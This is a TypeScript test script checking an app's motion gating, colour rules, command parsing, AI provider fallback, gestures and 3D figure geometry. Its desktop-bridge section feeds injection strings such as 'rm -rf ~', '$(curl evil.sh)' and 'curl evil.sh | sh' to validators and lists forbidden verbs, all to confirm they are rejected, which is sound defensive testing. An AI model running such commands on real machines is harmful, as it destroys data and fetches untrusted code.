/**
 * VERIFICATIONS.
 *
 * Three claims in this codebase are easy to assert and hard to keep true, so
 * they are checked rather than asserted:
 *
 *   1. Zero input produces EXACTLY zero drift — not "a small amount".
 *   2. A warned card can never go gold, at any degree of centredness.
 *   3. An injected command string resolves to "no such application" rather
 *      than executing.
 *
 * Run with: npm run verify
 */
import assert from 'node:assert/strict';
import { goldTerm, GOLD, WARNING, ACCENTS } from '../src/core/constants/palette.ts';
import { backAccumulate, detectFlavour } from '../src/server/data/instagram.ts';
import { rank } from '../src/components/launcher/rank.ts';
import { envelopesFor } from '../src/stores/useTransformStore.ts';
import { matchCommand } from '../src/ai/commands.ts';
import { matchWorld, NAMED_WORLDS } from '../src/core/constants/worlds.ts';
import { MODULES } from '../src/core/constants/modules.ts';
import { MAX_CARDS } from '../src/scene/human/beadMaterial.ts';
import { readCondition } from '../src/scene/env/condition.ts';
import { TwoHandRecognizer } from '../src/gesture/recognizers.ts';
import { telemetryRows } from '../src/stores/clientTelemetry.ts';
import { parseOllamaLine } from '../src/server/ai/ollama.ts';
import { describeKeyProblem, parseGeminiLine } from '../src/server/ai/gemini.ts';
import { decideProvider } from '../src/server/ai/provider.ts';
import { VERBS, isVerb } from '../src/server/bridge/verbs.ts';
import { splitClauses, pickVoice, type Clause } from '../src/ai/voiceProfile.ts';
import { BUST_PARTS } from '../src/scene/human/anatomy.ts';
import { sdBustCPU, sdMandibleCPU } from '../src/scene/human/sdf.ts';
import { EYES } from '../src/scene/human/anatomy.ts';
import { MARCH_STEPS, surfaceEnabled } from '../src/scene/human/surfaceQuality.ts';
import { figureFacesCamera } from '../src/scene/human/placement.ts';

let failures = 0;
function check(name: string, fn: () => void) {
  try {
    fn();
    console.log(`  ok   ${name}`);
  } catch (err) {
    failures++;
    console.log(`  FAIL ${name}`);
    console.log(`       ${err instanceof Error ? err.message : err}`);
  }
}

console.log('\nMOTION GATING — zero input, zero drift');

check('a zero multiplier contributes exactly zero to the carousel angle', () => {
  // This mirrors Carousel.tsx exactly: the term is SKIPPED, not scaled.
  const driftFor = (m: number, t: number) => (m === 0 ? 0 : Math.sin(t * 0.00007) * 0.00022 * m);
  let angle = 1.2345678;
  const start = angle;
  for (let frame = 0; frame < 600; frame++) {
    angle += driftFor(0, frame * 16.67);
  }
  assert.equal(angle, start, 'angle changed with the gate closed');
  // And the same loop with the gate open must actually move, or the test is
  // proving nothing.
  let open = start;
  for (let frame = 0; frame < 600; frame++) open += driftFor(1, frame * 16.67 * 1000);
  assert.notEqual(open, start, 'gate open produced no drift either — test is vacuous');
});

check('a zero multiplier contributes exactly zero to the camera transform', () => {
  // Mirrors Rig.tsx: every ambient term is inside `if (m !== 0)`.
  const sample = (m: number, time: number) => {
    let dx = 0;
    let dy = 0;
    let dz = 0;
    if (m !== 0) {
      dx = Math.sin(time * 0.17) * 0.16 * m;
      dy = Math.sin(time * 0.13 + 1.7) * 0.09 * m;
      dz = Math.sin(time * 0.09 + 0.4) * 0.11 * m;
    }
    return [dx, dy, dz];
  };
  for (let t = 0; t < 10; t += 0.0166) {
    const [dx, dy, dz] = sample(0, t);
    assert.equal(dx, 0);
    assert.equal(dy, 0);
    assert.equal(dz, 0);
  }
});

console.log('\nGOLD — alert isolation');

check('gold and warning orange are 18 degrees apart', () => {
  // Stated so the next person does not "fix" the hues by moving them further
  // apart and conclude the isolation problem is solved.
  assert.equal(GOLD.h - WARNING.h, 18);
});

check('a warned card is never gold, at any centredness', () => {
  for (let c = 0; c <= 1.0001; c += 0.001) {
    assert.equal(goldTerm(c, true), 0, `warned card went gold at centredness ${c}`);
  }
  // Dead centre and unwarned must be fully gold, or the gate is just "off".
  assert.equal(goldTerm(1, false), 1);
});

check('gold is earned continuously — no threshold', () => {
  let previous = -1;
  for (let c = 0; c <= 1; c += 0.01) {
    const g = goldTerm(c, false);
    assert.ok(g >= previous, 'gold is not monotonic in centredness');
    previous = g;
  }
  // A power curve, so a merely adjacent card gets almost none.
  assert.ok(goldTerm(0.5, false) < 0.1, 'gold at half-centre is not steep enough');
});

check('every module accent is distinguishable in hue', () => {
  const hues = Object.values(ACCENTS).map((a) => a.h).sort((a, b) => a - b);
  for (let i = 1; i < hues.length; i++) {
    assert.ok(hues[i] - hues[i - 1] >= 14, `accents ${hues[i - 1]} and ${hues[i]} are too close`);
  }
  // And the spectrum spans violet to cyan rather than clustering on one blue.
  assert.ok(hues[hues.length - 1] - hues[0] >= 90, 'accent spectrum is too narrow');
});

console.log('\nTRANSFORMATION CLOCK');

check('envelopes are bounded and the journey is monotonic', () => {
  let previous = -1;
  for (let t = 0; t <= 1.0001; t += 0.005) {
    const e = envelopesFor(t);
    for (const [name, value] of Object.entries(e)) {
      assert.ok(Number.isFinite(value), `${name} is not finite at t=${t}`);
      assert.ok(value >= -1e-6 && value <= 1 + 1e-6, `${name} out of range at t=${t}: ${value}`);
    }
    assert.ok(e.journey >= previous);
    previous = e.journey;
  }
});

check('the figure is fully formed at the end and absent at the start', () => {
  assert.equal(envelopesFor(0).body, 0);
  assert.equal(envelopesFor(0).presence, 0);
  assert.ok(envelopesFor(1).body > 0.999);
  assert.ok(envelopesFor(1).eyes > 0.999);
  // The core is a window: it must be gone by the time the body is there.
  assert.ok(envelopesFor(1).core < 0.001, 'the core outlived the body');
});

console.log('\nCOMMAND ENGINE');

check('both transform phrasings match locally', () => {
  assert.deepEqual(matchCommand('Nexus, transform into a human shape'), {
    kind: 'transform',
    to: 'human',
  });
  assert.deepEqual(matchCommand('return to spatial mode'), { kind: 'transform', to: 'spatial' });
});

check('module and ring commands match', () => {
  assert.deepEqual(matchCommand('open stocks'), { kind: 'open', module: 'stocks' });
  assert.deepEqual(matchCommand('show my reels'), { kind: 'open', module: 'instagram' });
  assert.deepEqual(matchCommand('rotate left'), { kind: 'rotate', direction: -1 });
});

check('an open question is not mistaken for a command', () => {
  assert.equal(matchCommand('How is Nvidia today?').kind, 'ask');
  assert.equal(matchCommand('Explain MCP').kind, 'ask');
});

check('environments are named places, not modules', () => {
  assert.deepEqual(matchCommand('take me to the fog chamber'), {
    kind: 'environment',
    world: 'fog-chamber',
  });
  assert.deepEqual(matchCommand('switch to the ocean platform'), {
    kind: 'environment',
    world: 'open-water',
  });
  // "go to the" is also a module opener, so the environment branch must not
  // swallow a module: it only fires when a world actually matches.
  assert.deepEqual(matchCommand('go to the stocks module'), {
    kind: 'open',
    module: 'stocks',
  });
});

check('every named world resolves from its own label and aliases', () => {
  for (const world of NAMED_WORLDS) {
    assert.equal(matchWorld(world.label), world.id, `${world.label} did not resolve`);
    for (const alias of world.aliases) {
      assert.ok(matchWorld(alias), `alias "${alias}" resolved to nothing`);
    }
  }
});

console.log('\nDESKTOP BRIDGE — injection');

check('an injected command string is not a verb', () => {
  for (const hostile of [
    'launch_app; rm -rf ~',
    '$(curl evil.sh)',
    '../../../bin/sh',
    'launch_app && shutdown -h now',
  ]) {
    assert.equal(isVerb(hostile), false, `"${hostile}" was accepted as a verb`);
  }
  assert.equal(isVerb('launch_app'), true);
});

check('destructive verbs do not exist in the enum', () => {
  for (const forbidden of ['shutdown', 'restart', 'delete_file', 'rm', 'exec', 'run_command']) {
    assert.ok(!(VERBS as readonly string[]).includes(forbidden), `${forbidden} is reachable`);
  }
});

check('an injected app name resolves to no application', async () => {
  // resolveApp scans the real disk. On a non-macOS box the roots are absent and
  // the scan is empty, which is still the correct outcome: nothing resolves.
  const { resolveApp } = await import('../src/server/bridge/apps.ts');
  for (const hostile of [
    'Safari; rm -rf ~',
    '`whoami`',
    '$(open -a Calculator)',
    'Terminal && curl evil.sh | sh',
  ]) {
    const resolved = await resolveApp(hostile);
    assert.equal(resolved, null, `"${hostile}" resolved to ${resolved?.name}`);
  }
});

console.log('\nINSTAGRAM');

check('token prefixes select the right API', () => {
  assert.equal(detectFlavour('IGAAxxxxxxxx'), 'instagram-login');
  assert.equal(detectFlavour('EAAxxxxxxxxx'), 'facebook-login');
  assert.equal(detectFlavour('random'), 'none');
  assert.equal(detectFlavour(undefined), 'none');
});

check('follower deltas back-accumulate into the true curve', () => {
  // The endpoint returns DAILY GAINS. Plotting them raw shows a flat line near
  // zero; the real curve is reconstructed backwards from the known total.
  const deltas = [10, 20, 30];
  const series = backAccumulate(1000, deltas);
  assert.deepEqual(series, [940, 950, 970, 1000]);
  assert.equal(series[series.length - 1], 1000, 'the curve must end at the known total');
});

check('the bead shader has a matrix slot for every module', () => {
  // MAX_CARDS sizes a GLSL uniform array, which is fixed at compile time and
  // is NOT bounds-checked. An eleventh module without a matching slot would
  // read garbage transforms for its particles, during the one sequence nobody
  // has a console open for.
  assert.equal(MAX_CARDS, MODULES.length);
});

console.log('\nAI PROVIDERS');

check('ollama tool arguments are accepted parsed OR as a JSON string', () => {
  // Ollama hands back an already-parsed object. OpenAI-compatible proxies in
  // front of it hand back a JSON string. Trusting one breaks the other.
  const parsed = parseOllamaLine(
    JSON.stringify({
      message: {
        content: '',
        tool_calls: [{ function: { name: 'open_module', arguments: { module: 'stocks' } } }],
      },
    }),
  );
  assert.deepEqual(parsed, [{ call: { name: 'open_module', args: { module: 'stocks' } } }]);

  const asString = parseOllamaLine(
    JSON.stringify({
      message: {
        content: '',
        tool_calls: [
          { function: { name: 'open_module', arguments: '{"module":"weather"}' } },
        ],
      },
    }),
  );
  assert.deepEqual(asString, [{ call: { name: 'open_module', args: { module: 'weather' } } }]);
});

check('a partial ollama line yields nothing rather than throwing', () => {
  // Chunk boundaries split JSON mid-object constantly; the carry picks it up.
  assert.deepEqual(parseOllamaLine('{"message":{"cont'), []);
  assert.deepEqual(parseOllamaLine(''), []);
  assert.deepEqual(parseOllamaLine('   '), []);
});

check('ollama content and errors map to the shared wire format', () => {
  assert.deepEqual(parseOllamaLine(JSON.stringify({ message: { content: 'hello' } })), [
    { t: 'hello' },
  ]);
  assert.deepEqual(parseOllamaLine(JSON.stringify({ error: 'model not found' })), [
    { error: 'model not found' },
  ]);
  // A done frame with no content must not emit an empty token.
  assert.deepEqual(parseOllamaLine(JSON.stringify({ message: { content: '' }, done: true })), []);
});

check('gemini SSE maps to the same wire format', () => {
  const line =
    'data: ' +
    JSON.stringify({
      candidates: [
        {
          content: {
            parts: [{ text: 'Nvidia is up.' }, { functionCall: { name: 'open_module', args: { module: 'stocks' } } }],
          },
        },
      ],
    });
  assert.deepEqual(parseGeminiLine(line), [
    { t: 'Nvidia is up.' },
    { call: { name: 'open_module', args: { module: 'stocks' } } },
  ]);
  // Non-data lines and the terminator are ignored, not treated as content.
  assert.deepEqual(parseGeminiLine(''), []);
  assert.deepEqual(parseGeminiLine('data: [DONE]'), []);
  assert.deepEqual(parseGeminiLine('event: ping'), []);
});

check('both providers produce the SAME shape for the same answer', () => {
  // This is the point of normalising at the server edge: the client must not
  // be able to tell which brain replied.
  const fromOllama = parseOllamaLine(JSON.stringify({ message: { content: 'Understood.' } }));
  const fromGemini = parseGeminiLine(
    'data: ' + JSON.stringify({ candidates: [{ content: { parts: [{ text: 'Understood.' }] } }] }),
  );
  assert.deepEqual(fromOllama, fromGemini);
});

check('a running but EMPTY ollama is not mistaken for a usable one', () => {
  // The real server answers /api/tags with {"models":[]} when nothing is
  // pulled — a success carrying an empty list. Treating reachable as usable
  // committed NEXUS to a backend that 404s every question. Found by running
  // the actual binary; a stand-in always has models, so it never showed.
  const base = {
    model: 'llama3.2',
    host: 'http://127.0.0.1:11434',
    geminiModel: 'gemini-2.0-flash',
  };
  const goodKey = 'AIzaSyAbCdEf0123456789AbCdEf0123456789';

  // Empty Ollama plus a working key must fall through to Gemini.
  assert.equal(decideProvider({ ...base, models: [], key: goodKey }).provider, 'gemini');

  // Empty Ollama and nothing else must say exactly what to run.
  const stuck = decideProvider({ ...base, models: [], key: '' });
  assert.equal(stuck.provider, 'none');
  assert.match(stuck.reason, /ollama pull llama3\.2/);

  // Unreachable Ollama is a different case and still prefers a good key.
  assert.equal(decideProvider({ ...base, models: null, key: goodKey }).provider, 'gemini');
});

check('local wins when it can actually answer', () => {
  const base = {
    model: 'llama3.2',
    host: 'http://127.0.0.1:11434',
    geminiModel: 'gemini-2.0-flash',
  };
  const goodKey = 'AIzaSyAbCdEf0123456789AbCdEf0123456789';

  // A pulled model beats a hosted key.
  const local = decideProvider({ ...base, models: ['llama3.2:latest'], key: goodKey });
  assert.equal(local.provider, 'ollama');
  assert.equal(local.model, 'llama3.2');

  // A different model pulled is used rather than failing on the configured one.
  const other = decideProvider({ ...base, models: ['qwen2.5:7b'], key: '' });
  assert.equal(other.provider, 'ollama');
  assert.equal(other.model, 'qwen2.5:7b');

  // An explicit request is obeyed without probing.
  assert.equal(
    decideProvider({ ...base, models: null, key: goodKey, requested: 'ollama' }).provider,
    'ollama',
  );
});

check('the real not-found error is translated into the fix', () => {
  // Captured from the actual Ollama server, single quotes and all. The regex
  // that matches this was written from memory before the real string was ever
  // seen; this pins it to the observed text.
  const REAL = String.raw`{"error":"model 'llama3.2' not found"}`;
  assert.match(REAL, /model .* not found|no such model/i);
});

check('a credential that is not an AI Studio key is named, not passed through', () => {
  // The exact token shape that wasted a round trip: valid Google credential,
  // wrong mechanism for this endpoint.
  assert.match(describeKeyProblem('AQ.Ab8RN6SOMETHING')!, /OAuth access token/);
  assert.match(describeKeyProblem('ya29.a0Af')!, /OAuth access token/);
  assert.match(describeKeyProblem('{"type":"service_account"}')!, /Vertex AI/);
  assert.match(describeKeyProblem('sk-proj-abc')!, /OpenAI/);
  assert.match(describeKeyProblem('nonsense')!, /AIzaSy/);
  // Every message offers the no-key way out.
  for (const bad of ['AQ.x', 'ya29.x', 'sk-x', 'nonsense']) {
    assert.match(describeKeyProblem(bad)!, /ollama/i, `no local fallback offered for ${bad}`);
  }
  // A well-formed key passes.
  assert.equal(describeKeyProblem('AIzaSyAbCdEf0123456789AbCdEf0123456789'), null);
});

console.log('\nTWO-HAND GESTURES');

check('multi-select is told apart from zoom by dwell, not by pose', () => {
  const held = (x: number, pinch: number) => ({
    x,
    y: 0,
    z: 0.5,
    pinch,
    openness: 0.1,
    present: true,
  });

  // Hands pinched and MOVING apart is a zoom, and must never select.
  const zoomer = new TwoHandRecognizer();
  let now = 0;
  zoomer.detect(held(-0.3, 0.9), held(0.3, 0.9), now); // establishes the baseline
  const zoomResults: string[] = [];
  for (let i = 0; i < 40; i++) {
    now += 50;
    const spread = 0.3 + i * 0.02;
    const r = zoomer.detect(held(-spread, 0.9), held(spread, 0.9), now);
    if (r) zoomResults.push(r.name);
  }
  assert.ok(zoomResults.includes('two-hand-zoom'), 'moving apart did not zoom');
  assert.ok(
    !zoomResults.includes('two-hand-multi-select'),
    'a zoom fired a multi-select on its way past',
  );

  // Hands pinched and HELD still selects, once, after the dwell.
  const selector = new TwoHandRecognizer();
  now = 0;
  selector.detect(held(-0.3, 0.9), held(0.3, 0.9), now);
  const selectResults: string[] = [];
  for (let i = 0; i < 40; i++) {
    now += 50;
    const r = selector.detect(held(-0.3, 0.9), held(0.3, 0.9), now);
    if (r) selectResults.push(r.name);
  }
  assert.deepEqual(
    selectResults,
    ['two-hand-multi-select'],
    `held pinch produced ${JSON.stringify(selectResults)}`,
  );
});

check('one hand alone can never fire a two-hand gesture', () => {
  const r = new TwoHandRecognizer();
  const present = { x: 0.2, y: 0, z: 0.5, pinch: 0.95, openness: 0.1, present: true };
  const absent = { x: 0, y: 0, z: 0, pinch: 0, openness: 0, present: false };
  for (let t = 0; t < 3000; t += 50) {
    assert.equal(r.detect(present, absent, t), null);
  }
});

console.log('\nSYSTEM TELEMETRY');

check('the system card reports every signal the brief names', () => {
  const rows = telemetryRows(
    {
      cores: 8,
      deviceMemoryGb: 16,
      battery: { level: 0.42, charging: false },
      network: { type: '4g', downlinkMbps: 12 },
      storage: { usedGb: 1.2, quotaGb: 120 },
      gpu: 'Apple M3 Max',
      fps: 60,
    },
    [],
  );
  const labels = rows.map((r) => r[0]);
  for (const signal of ['cpu', 'gpu', 'battery', 'network', 'memory', 'storage']) {
    assert.ok(labels.includes(signal), `${signal} is missing from the system card`);
  }
});

check('a browser without these APIs still produces a card', () => {
  const rows = telemetryRows(
    {
      cores: null,
      deviceMemoryGb: null,
      battery: null,
      network: null,
      storage: null,
      gpu: 'unknown',
      fps: 0,
    },
    [['heap', '61 MB']],
  );
  assert.equal(rows.length, 6);
  // Missing signals say so rather than rendering "null" or vanishing.
  assert.ok(rows.every(([, value]) => value.length > 0 && !value.includes('null')));
  // Device memory falls back to what the server did report.
  assert.equal(rows.find((r) => r[0] === 'memory')?.[1], '61 MB');
});

console.log('\nWEATHER');

check('every condition the API reports maps to something drawable', () => {
  assert.equal(readCondition('Thunderstorm'), 'storm');
  assert.equal(readCondition('light rain'), 'rain');
  assert.equal(readCondition('Drizzle'), 'rain');
  assert.equal(readCondition('Snow'), 'snow');
  assert.equal(readCondition('Mist'), 'fog');
  assert.equal(readCondition('haze'), 'fog');
  assert.equal(readCondition('broken clouds'), 'clouds');
  // Anything unrecognised is clear rather than undefined: a missing profile
  // would be an empty sky AND a shader reading undefined uniforms.
  assert.equal(readCondition('something new'), 'clear');
  assert.equal(readCondition(undefined), 'clear');
});

console.log('\n⌘K RANKING');

check('the ladder is ordinal: prefix beats initials beats boundary beats substring', () => {
  const items = [
    { id: '1', label: 'Xcode', source: 'app' as const },
    { id: '2', label: 'Visual Studio Code', source: 'app' as const },
    { id: '3', label: 'Code Runner', source: 'app' as const },
  ];
  // "code" — a word-boundary match must beat a mid-word substring match.
  const byCode = rank(items, 'code');
  assert.equal(byCode[0].label, 'Code Runner', 'prefix match did not win');
  assert.ok(
    byCode.findIndex((i) => i.label === 'Visual Studio Code') <
      byCode.findIndex((i) => i.label === 'Xcode'),
    'mid-word substring outranked a word-boundary match',
  );
  // Initials.
  assert.equal(rank(items, 'vsc')[0].label, 'Visual Studio Code');
});

console.log('\nTHE FIGURE');

check('the figure faces the camera', () => {
  // The bust is authored facing +Z and the camera looks along +Z, so a
  // placement that only translates shows the viewer the back of its head.
  // That shipped once; it is an assertion now.
  assert.ok(figureFacesCamera(), 'the nose is further from the camera than the occiput');
});

check('the mandible is a region, not a height', () => {
  // The chest must not belong to the jaw. It did, because membership was
  // "below the chin", and opening the mouth swung the whole torso.
  const chin = sdMandibleCPU(0, 1.5215, 0.070);
  const chest = sdMandibleCPU(0, 1.15, 0.05);
  assert.ok(chin < 0.01, `the chin should be mandible mass, got ${chin.toFixed(3)}`);
  assert.ok(chest > 0.2, `the chest must be far from the mandible, got ${chest.toFixed(3)}`);
});

check('the eye sockets are recesses, not bumps', () => {
  /**
   * Measured against the FIELD, not against hard-coded coordinates.
   *
   * The first version of this check named three points by number, and every
   * subsequent reshaping of the face moved them — so it failed on a face whose
   * sockets were perfectly good. A test that has to be edited whenever the
   * thing it tests changes is not testing anything.
   *
   * The claim is geometric and survives any reshaping: the surface on the eye
   * axis must sit FURTHER BACK than the surface on the cheek just below it.
   * That is what "the eye is set into the head" means.
   */
  const frontZ = (x: number, y: number): number => {
    let z = 0.30;
    for (let i = 0; i < 500; i++) {
      const d = sdBustCPU(x, y, z);
      if (d < 0.0002) return z;
      z -= Math.max(d * 0.7, 0.0002);
      if (z < -0.2) return Number.NaN;
    }
    return Number.NaN;
  };

  const eyeX = EYES.right[0];
  const eyeY = EYES.right[1];
  const atEye = frontZ(eyeX, eyeY);
  const atCheek = frontZ(eyeX, eyeY - 0.030);
  assert.ok(Number.isFinite(atEye) && Number.isFinite(atCheek), 'no surface found');
  assert.ok(
    atEye < atCheek - 0.002,
    `the eye should sit behind the cheek below it (eye ${(atEye * 1000).toFixed(1)}mm, ` +
      `cheek ${(atCheek * 1000).toFixed(1)}mm)`,
  );
});

check('the nose is the most forward point on the face', () => {
  // It stopped being so once, when the face block was pushed out to the same
  // depth — and the whole lower face fused into a muzzle. Nothing caught it.
  const frontZ = (x: number, y: number): number => {
    let z = 0.30;
    for (let i = 0; i < 500; i++) {
      const d = sdBustCPU(x, y, z);
      if (d < 0.0002) return z;
      z -= Math.max(d * 0.7, 0.0002);
      if (z < -0.2) return Number.NaN;
    }
    return Number.NaN;
  };
  let best = -Infinity;
  let bestY = 0;
  for (let y = 1.50; y <= 1.70; y += 0.002) {
    const z = frontZ(0, y);
    if (Number.isFinite(z) && z > best) {
      best = z;
      bestY = y;
    }
  }
  assert.ok(
    bestY > 1.570 && bestY < 1.592,
    `the most forward midline point is at y=${(bestY * 1000).toFixed(0)}mm, which is not the nose`,
  );
});

check('no carved part is also mandible mass', () => {
  // A carve removes mass and cannot define where mass is. The field generator
  // throws on this, so the table must never contain one.
  for (const part of BUST_PARTS) {
    assert.ok(!(part.carve && part.jaw), `${part.name} is both carved and jaw`);
  }
});

check('a tier that cannot march still shows a figure', () => {
  /**
   * The beads retire only when the surface will replace them.
   *
   * These were two separate expressions of the same intent, and they
   * disagreed: tier 0 refuses to march, but the beads handed over anyway, so a
   * weak machine reaching the humanoid phase was shown an empty room. It is
   * one function now, and this asserts that every tier ends up with something
   * drawn.
   */
  for (const tier of [0, 1, 2, 3]) {
    const marches = MARCH_STEPS[tier as 0 | 1 | 2 | 3] > 0;
    assert.equal(
      surfaceEnabled(tier),
      marches,
      `tier ${tier}: the beads and the surface disagree about who is drawing`,
    );
  }
  assert.equal(surfaceEnabled(0), false, 'tier 0 must keep the beads');
  assert.ok(surfaceEnabled(3), 'the top tier must draw the surface');
});

console.log('\nVOICE');

check('a line is broken into clauses, longest pause at a full stop', () => {
  const clauses = splitClauses('I am here. You are late, obviously; I waited.');
  assert.ok(clauses.length >= 4, `expected several clauses, got ${clauses.length}`);
  const full = clauses.find((c: Clause) => c.text.endsWith('.') && c.text.startsWith('I am'));
  const comma = clauses.find((c: Clause) => c.text.endsWith(','));
  assert.ok(full && comma, 'did not split at both a full stop and a comma');
  assert.ok(
    full.pauseMs > comma.pauseMs,
    `a full stop must hold longer than a comma (${full.pauseMs} vs ${comma.pauseMs})`,
  );
});

check('the last clause does not hold a pause', () => {
  const clauses = splitClauses('Enough. Go.');
  assert.equal(clauses[clauses.length - 1].pauseMs, 0, 'trailing silence after the last word');
});

check('a line with no punctuation is still spoken', () => {
  const clauses = splitClauses('do it');
  assert.equal(clauses.length, 1);
  assert.equal(clauses[0].text, 'do it');
});

check('the deepest available voice is chosen over a bright one', () => {
  const voices = [
    { name: 'Google UK English Female', lang: 'en-GB' },
    { name: 'Samantha', lang: 'en-US' },
    { name: 'Daniel', lang: 'en-GB' },
  ] as SpeechSynthesisVoice[];
  assert.equal(pickVoice(voices)?.name, 'Daniel');
});

check('an unknown voice set still resolves to English', () => {
  const voices = [
    { name: 'Zosia', lang: 'pl-PL' },
    { name: 'Some Male Voice', lang: 'en-AU' },
  ] as SpeechSynthesisVoice[];
  assert.equal(pickVoice(voices)?.name, 'Some Male Voice');
});

check('no voice at all is not a crash', () => {
  assert.equal(pickVoice([]), null);
});

const run = async () => {
  // The async check above needs to settle before the summary.
  await new Promise((r) => setTimeout(r, 300));
  console.log(
    failures === 0 ? '\nAll verifications passed.\n' : `\n${failures} verification(s) failed.\n`,
  );
  process.exit(failures === 0 ? 0 : 1);
};
void run();
